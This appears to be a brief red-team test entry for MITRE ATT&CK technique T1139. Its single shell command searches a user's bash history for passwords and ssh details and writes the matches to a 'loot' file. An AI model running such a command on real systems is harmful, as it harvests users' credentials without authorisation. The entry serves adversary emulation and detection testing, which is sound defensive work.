# Bash History

MITRE ATT&CK Technique: [T1139](https://attack.mitre.org/wiki/Technique/T1139)


    cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot.txt
